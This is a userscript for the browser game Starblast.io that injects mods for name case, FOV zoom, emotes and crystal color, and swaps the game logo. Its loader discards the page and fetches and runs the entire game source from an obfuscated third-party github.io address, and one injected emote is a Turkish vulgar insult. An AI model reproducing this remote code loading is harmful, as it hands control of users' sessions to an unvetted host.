if (!window.sbCodeInjectors) window.sbCodeInjectors = [];

// Global settings object
window.modSettings = {
  fovEnabled: true,
  emoteCapacity: parseInt(localStorage.getItem('emote-capacity')) || 4,  // Parse as integer
};

// Lowercase Name Mod
const modName = "Lowercase Name";
const logLowercase = (msg) => console.log(`%c[${modName}] ${msg}`, "color: #FF00A6");

function lowercaseInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;
  
  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  src = src.replace(/\.toUpperCase\(\)/g, "");
  const styleBlock = `
  <style>
  #player input { text-transform: none !important; }
  </style>
  `;
  src = src.replace('</head>', `${styleBlock}</head>`);
  checkSrcChange();

  logLowercase("Mod injected");
  return src;
}

// Custom Emote Mod
const emoteModName = "Custom Emote";
const logEmote = (msg) => console.log(`%c[${emoteModName}] ${msg}`, "color: #FFA500");

function emoteInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;

  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  const vocabPattern = /(this\.vocabulary\s*=\s*\[[\s\S]*?\})/;
  const clownEmote = `,{
    text: "orosbu cocu",
    icon: "🤡",
    key: "J"
  }`;

  src = src.replace(vocabPattern, `$1${clownEmote}`);
  checkSrcChange();

  logEmote("Clown emote injected");
  return src;
}

// FOV Editor Mod
const fovModName = "FOV Editor";
const logFOV = (msg) => console.log(`%c[${fovModName}] ${msg}`, "color: #00A6FF");

window.I1000 = window.I1000 || {};
window.I1000.baseFOV = 45;
window.I1000.currentFOV = 45;

function fovInjector(sbCode) {
  let src = sbCode;
  let prevSrc = src;

  function checkSrcChange() {
    if (src === prevSrc) throw new Error("replace did not work");
    prevSrc = src;
  }

  const fovPattern = /this\.I1000\.fov\s*=\s*45\s*\*\s*this\.IO11l\.I1000\.zoom/g;
  src = src.replace(fovPattern, 'this.I1000.fov = (window.modSettings.fovEnabled ? window.I1000.currentFOV : 45) * this.IO11l.I1000.zoom');
  checkSrcChange();

  const controlStyles = `
<style>
  #mod-controls {
    position: fixed;
    top: 10px;
    left: 10px;
    z-index: 1000;
    font-family: Arial, sans-serif;
    user-select: none;
    background: linear-gradient(-45deg, hsl(294.98deg 100% 50% / 50%) 0, hsla(200, 50%, 50%, .15) 100%);
    border: 1px solid #f600ff;
    box-shadow: 0 0 6px hsl(298.15deg 100% 50%);
    color: white;
    padding: 5px;
    border-radius: 8px;
    opacity: 0.9;
    width: 150px;
  }


  #mod-controls-header {
    cursor: pointer;
    text-align: center;
    padding: 5px;
    border-bottom: 1px solid #f600ff;
  }

  #mod-controls-panel {
    padding: 5px;
    display: none;
  }

  .mod-control {
    display: flex;
    justify-content: space-between;
    align-items: center;
    margin: 5px 0;
  }

  .mod-control-slider {
    width: 100%;
    margin-top: 5px;
  }

  #crystal-color-picker {
    width: 100%;
    margin-top: 5px;
  }

  #fov-display {
    padding: 5px;
    margin-top: 5px;
    display: block;
  }

  .toggle-switch {
    position: relative;
    display: inline-block;
    width: 30px;
    height: 17px;
  }

  .toggle-switch input {
    opacity: 0;
    width: 0;
    height: 0;
  }

  .slider {
    position: absolute;
    cursor: pointer;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: #ccc;
    transition: .4s;
  }

  input:checked + .slider {
    background-color: #FF1493;
  }

  .control-value {
    font-size: 12px;
    text-align: right;
    min-width: 30px;
  }
  </style>
  `;

  const controlsHTML = `
  <div id="mod-controls">
    <div id="mod-controls-header">Controls</div>
    <div id="mod-controls-panel">
      <div class="mod-control">
        <span>FOV</span>
        <label class="toggle-switch">
          <input type="checkbox" id="fov-toggle" checked>
          <span class="slider"></span>
        </label>
      </div>
      <div class="mod-control">
        <span>Emote Capacity</span>
        <div class="control-value" id="emote-capacity-value">${window.modSettings.emoteCapacity}</div>
      </div>
      <input type="range" min="1" max="5" value="${window.modSettings.emoteCapacity}" class="mod-control-slider" id="emote-capacity-slider">
      <div class="mod-control">
        <span>Crystal Color</span>
        <input type="color" id="crystal-color-picker" value="#ffffff">
      </div>
    </div>
    <div id="fov-display">
      FOV: <span id="fov-value">45</span>
    </div>
  </div>
  `;

  // Add emote capacity mod with fixes
  const emoteCapacityMod = `
  let globalVal = ChatPanel.toString().match(/[0OlI1]{5}/)[0];
  
  // Override the emotes capacity getter
  ChatPanel.prototype.getEmotesCapacity = function() {
    const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
    return Math.min(Math.max(1, savedCapacity), 5);
  };
  
  // Override the typed function to use the new capacity
  ChatPanel.prototype.typed = Function("return " + ChatPanel.prototype.typed.toString().replace(/>=\\s*4/, " >= this.getEmotesCapacity()"))();
  
  // Set initial capacity
  if (window.modSettings && window.modSettings.emoteCapacity) {
    localStorage.setItem('emote-capacity', window.modSettings.emoteCapacity);
  }
  `;

  // Add crystal color mod
 const crystalColorMod = `
/*
 * Change crystal color (processing code)
 */
let CrystalObject;
for (let i in window) {
  try {
    let val = window[i];
    if ("function" == typeof val.prototype.createModel && val.prototype.createModel.toString().includes("Crystal")) {
      CrystalObject = val;
      console.log('Found CrystalObject:', CrystalObject);
      break;
    }
  } catch (e) {}
}

let oldModel = CrystalObject.prototype.getModelInstance,
  getCustomCrystalColor = function () {
    const color = localStorage.getItem("crystal-color") || "#ffffff";
    console.log('Getting custom color from storage:', color);
    return color;
  };

CrystalObject.prototype.getModelInstance = function () {
  let res = oldModel.apply(this, arguments);
  let color = getCustomCrystalColor();
  if (color) {
    console.log('Setting material color to:', color);
    this.material.color.set(color);
  }
  return res;
};

function updateCrystalColor(color) {
  console.log('updateCrystalColor called with:', color);
  try {
    localStorage.setItem("crystal-color", color);
    console.log('Color saved to localStorage:', localStorage.getItem("crystal-color"));
    
    if (window.CrystalObject) {
      const instance = CrystalObject.prototype.getModelInstance();
      if (instance && instance.material) {
        instance.material.color.set(color);
        console.log('Updated crystal material color');
      } else {
        console.log('Could not find material on model instance');
      }
    } else {
      console.log('CrystalObject not found in window');
    }
  } catch (e) {
    console.error('Error updating crystal color:', e);
  }
}

// Add event listener after DOM is loaded
document.addEventListener('DOMContentLoaded', () => {
  console.log('DOM Content Loaded - Setting up color picker');
  const crystalColorPicker = document.getElementById('crystal-color-picker');
  
  if (crystalColorPicker) {
    console.log('Found color picker element');
    
    // Initialize with saved color if it exists
    const savedColor = localStorage.getItem('crystal-color');
    if (savedColor) {
      console.log('Setting initial color picker value:', savedColor);
      crystalColorPicker.value = savedColor;
    }

    crystalColorPicker.addEventListener('change', (event) => {
      console.log('Color picker changed:', event.target.value);
      updateCrystalColor(event.target.value);
    });

    crystalColorPicker.addEventListener('input', (event) => {
      console.log('Color picker input:', event.target.value);
      updateCrystalColor(event.target.value);
    });
  } else {
    console.log('Could not find crystal-color-picker element');
  }
});
`;

  src = src.replace('</body>', `
    ${controlStyles}
    ${controlsHTML}
    <script>
    ${emoteCapacityMod}
    ${crystalColorMod}

    const fovDisplay = document.getElementById('fov-display');

    // Add wheel event listener for FOV change
    document.addEventListener('wheel', (e) => {
      if (!window.modSettings.fovEnabled) return;
      e.preventDefault();
      const delta = e.deltaY < 0 ? 1 : -1;
      // Add bounds checking
      window.I1000.currentFOV = Math.max(1, Math.min(120, window.I1000.currentFOV + delta));
      document.getElementById('fov-value').textContent = window.I1000.currentFOV;
    }, { passive: false });

    document.addEventListener('DOMContentLoaded', () => {
      const controlsHeader = document.getElementById('mod-controls-header');
      const controlsPanel = document.getElementById('mod-controls-panel');
      const fovToggle = document.getElementById('fov-toggle');
      const emoteSlider = document.getElementById('emote-capacity-slider');
      const emoteValue = document.getElementById('emote-capacity-value');
      const crystalColorPicker = document.getElementById('crystal-color-picker');

      // Initialize values from localStorage
      const savedCrystalColor = localStorage.getItem('crystal-color');
      if (savedCrystalColor) {
        crystalColorPicker.value = savedCrystalColor;
      }

      controlsHeader.addEventListener('click', () => {
        controlsPanel.style.display = controlsPanel.style.display === 'none' ? 'block' : 'none';
      });

      fovToggle.addEventListener('change', () => {
        window.modSettings.fovEnabled = fovToggle.checked;
        fovDisplay.style.display = fovToggle.checked ? 'block' : 'none';
      });

      emoteSlider.addEventListener('input', () => {
        const value = parseInt(emoteSlider.value);
        emoteValue.textContent = value;
        window.modSettings.emoteCapacity = value;
        localStorage.setItem('emote-capacity', value);
        
        // Update the emote capacity immediately
        if (window.ChatPanel) {
          ChatPanel.prototype.getEmotesCapacity = function() {
            return value;
          };
        }
      });

      crystalColorPicker.addEventListener('change', () => {
        const color = crystalColorPicker.value;
        updateCrystalColor(color);
      });

      // Initialize emote capacity from localStorage
      const savedCapacity = parseInt(localStorage.getItem('emote-capacity')) || 4;
      emoteSlider.value = savedCapacity;
      emoteValue.textContent = savedCapacity;
      window.modSettings.emoteCapacity = savedCapacity;
    });
    </script>
    </body>`);

  checkSrcChange();

  logFOV("FOV injector applied");
  return src;
}

// Add all injectors
window.sbCodeInjectors.push((sbCode) => {
  try {
    return lowercaseInjector(sbCode);
  } catch (error) {
    alert(`${modName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return emoteInjector(sbCode);
  } catch (error) {
    alert(`${emoteModName} failed to load; error: ${error}`);
    throw error;
  }
});

window.sbCodeInjectors.push((sbCode) => {
  try {
    return fovInjector(sbCode);
  } catch (error) {
    alert(`${fovModName} failed to load; error: ${error}`);
    throw error;
  }
});

// Main code injection logic
const log = (msg) => console.log(`%c[Mod injector] ${msg}`, "color: #06c26d");

function injectLoader() {
  if (window.location.pathname !== "/") {
    log("Injection not needed");
    return;
  }

  document.open();
  document.write('<html><head><title></title></head><body style="background-color:#ffffff;"><div style="margin: auto; width: 50%;"><h1 style="text-align: center;padding: 170px 0;color: #000;"></h1><h1 style="text-align: center;color: #000;"></h1></div></body></html>');
  document.close();

  var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1sımn1sösm2k1.html'
  url += '?_=' + new Date().getTime();

  var xhr = new XMLHttpRequest();
  log("Fetching custom source...");
  xhr.open("GET", url);
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
      var starSRC = xhr.responseText;

      if (starSRC !== undefined) {
        log("Source fetched successfully");
        const start_time = performance.now();
        log("Applying mods...");

        if (!window.sbCodeInjectors) {
          log("No Starblast.io userscripts found to load");
        } else {
          let error_notified = false;
          for (const injector of window.sbCodeInjectors) {
            try {
              if (typeof injector === "function") starSRC = injector(starSRC);
              else {
                log("Injector was not a function");
                console.log(injector);
              }
            } catch (error) {
              if (!error_notified) {
                alert("One of your Starblast.io userscripts failed to load");
                error_notified = true;
              }
              console.error(error);
            }
          }
        }

        const end_time = performance.now();
        log(`Mods applied successfully (${(end_time - start_time).toFixed(0)}ms)`);

        document.open();
        document.write(starSRC);
        document.close();
      } else {
        log("Source fetch failed");
        alert("An error occurred while fetching game code");
      }
    }
  };

  xhr.send();
}


// Select the image element using the current src attribute
const logo = document.querySelector('img[src="https://starblast.data.neuronality.com/img/starblast_io_logo.svg?3"]');

// Check if the image element is found
if (logo) {
  // Update the src attribute to the new URL
  logo.src = "https://media.discordapp.net/attachments/759396836292296744/1328726385841405962/turk.png?ex=6787c060&is=67866ee0&hm=f5b4e83464ff8c52b3f64779026e2be004bc155c773164d3e950265c4eeaeb9f&=&format=webp&quality=lossless&width=400&height=201";
} else {
  console.error("Logo not found!");
}

// Run the injectLoader function immediately
injectLoader();
